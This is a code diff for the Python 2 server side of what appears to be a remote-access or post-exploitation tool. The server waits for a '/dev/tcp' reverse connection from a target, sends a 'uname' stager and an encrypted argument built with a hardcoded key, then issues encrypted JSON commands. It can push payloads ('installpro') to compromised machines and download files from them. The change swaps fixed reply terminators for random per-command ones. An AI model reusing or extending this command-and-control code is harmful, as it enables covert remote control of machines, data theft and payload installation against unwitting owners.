@@ -9,6 +9,9 @@ import time
 from threading import Thread
 from src.encryption.ESEncryptor import ESEncryptor
 from src.shell.shell import ESShell
+import random
+import string
+import json
 
 datadir = "data"
 
@@ -23,21 +26,23 @@ class ESSession:
         self.CDA = CDA
 
 class ESServer:
-    def __init__(self,escryptor,terminator,liveterminator,helper):
+    def __init__(self,escryptor,helper):
         self.sessions = {}
         self.escryptor = escryptor
-        self.terminator = terminator
-        self.liveterminator = liveterminator
         self.shell = ESShell()
         self.binaryKey = "spGHbigdxMBJpbOCAr3rnS3inCdYQyZV"
         self.h = helper
         self.inputhandle = ""
         self.msrunning = 0
     
+    def term(self):
+        return ''.join((random.choice(string.letters)) for x in range(16))
+
     def listen(self,host,port,verbose):
+        term = self.term()
         INSTRUCT_ADDRESS = "/dev/tcp/"+str(host)+"/"+str(port)
         INSTRUCT_BINARY_ARGUMENT = ESEncryptor(self.binaryKey,16).encryptString(
-            str(host)+" "+str(port)+" "+self.escryptor.key+" "+self.terminator+" "+self.liveterminator
+            str(host)+" "+str(port)+" "+self.escryptor.key+" "+term
         )
         INSTRUCT_STAGER = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
         
@@ -103,7 +108,7 @@ class ESServer:
             self.h.strinfo("Waiting For Connection...")
         conn, hostAddress = s.accept()
         s.settimeout(5)
-        data = self.receiveString(conn)
+        data = self.receiveString(conn,term)
         if data:
             uid = data.split(" ")[0]
             data = data.replace(uid+" ","")
@@ -252,15 +257,29 @@ class ESServer:
         else:
             self.h.strinfo("Please specify a session id")
 
+
+    def packcommand(self,str,term):
+        #json encode and encrypt
+        data = json.dumps({"cmd":str.split()[0],
+                          "term":term,
+                          "args":str[len(str.split()[0])+1:]})
+        return self.escryptor.encryptString(data)
+
     def sendCommand(self,str,conn):
-        conn.send(self.escryptor.encryptString(str))
+        #create terminator for reply data and send data
+        terminator = self.term()
+        conn.send(self.packcommand(str,terminator))
+        #receive response
         try:
-            data = self.receiveString(conn)
-            if data != "": print data
+            rdata = self.receiveString(conn,terminator)
+            if rdata != "":
+                print rdata
         except Exception as e:
             print e
 
-    def receiveString(self,conn):
+    def receiveString(self,conn,terminator):
+        #live terminator is just terminator reversed
+        liveterminator = terminator[::-1]
         data = ""
         islivestream = 0;
         while 1:
@@ -269,21 +288,23 @@ class ESServer:
                 if not data:
                     return "something went wrong"
                 #terminator when we are done receiving data
-                if self.terminator in data:
+                if terminator in data:
                     if islivestream:
                         return ""
-                    data = data.split(self.terminator)[0]
+                    data = data.split(terminator)[0]
                     try:
                         result = self.escryptor.decrypt(data)
                         if result == "-1":
                             result = "invalid command"
                         return result
                     except Exception as e:
-                        print str(e)
-                elif self.liveterminator in data:
+                        print terminator
+                        print data
+                        return str(e)
+                elif liveterminator in data:
                         islivestream = 1
                         #split from live terminator
-                        splitdata = data.split(self.liveterminator)
+                        splitdata = data.split(liveterminator)
                         #decrypt data before last self.liveterminator
                         try:
                             tmpdata = self.escryptor.decrypt(splitdata[len(splitdata) - 2])
@@ -294,40 +315,42 @@ class ESServer:
             #if we are live send kill task
             except KeyboardInterrupt:
                 print ""
-                conn.send(self.escryptor.encryptString("endtask"))
+                conn.send(self.packcommand("endtask",terminator))
 
 
     def uploadFile(self,fileName,location,conn):
+        terminator = self.term()
         f = open(fileName,"rb")
-        fileData = bben(f.read())
+        fileData = self.h.bben(f.read())
         f.close()
         filesize = str(sys.getsizeof(fileData))
         #send cmd
-        conn.send(encryptStr("installpro "+filesize))
+        conn.send(self.packcommand("installpro",terminator))
         #check if we are good to go
-        status = receiveString(conn)
+        status = self.receiveString(conn,terminator)
         if status == "1":
             #sendfile
             self.h.strinfo("Uploading "+fileName)
             self.h.strinfo("Size = "+filesize)
             conn.send(fileData+terminator)
             #blank
-            conn.recv(1)
+            conn.recv(128)
             self.h.strinfo("Finished")
         else:
             self.h.strinfo(status)
 
     def downloadFile(self,command,conn):
         #send download command
-        conn.send(self.escryptor.encryptString(command))
+        term = self.term()
+        conn.send(self.packcommand(command,term))
+        sof = self.escryptor.decrypt(conn.recv(128))
+        
         args = command.split()
         
-        #receive file size
-        sof = self.receiveString(conn)
         try:
             sizeofFile = int(sof)
         except:
-            self.hstrinfo("Error: "+sof)
+            self.h.strinfo("Error: "+sof)
             return
         self.h.strinfo("file size: "+str(sizeofFile))
 
@@ -361,10 +384,10 @@ class ESServer:
                 progress = sizeofFile
             sys.stdout.write("\r"+self.h.strinfoGet(self.h.WHITE+"Downloading "+filename+" ("+str(progress)+"/"+str(sizeofFile)+") bytes"))
             #write to file
-            if self.terminator in chunk:
+            if term in chunk:
                 print ""
                 #replace our endoffile keyword
-                chunk = chunk.replace(self.terminator,"")
+                chunk = chunk.replace(term,"")
                 #write the remaining chunk
                 file.write(chunk)
                 file.close()
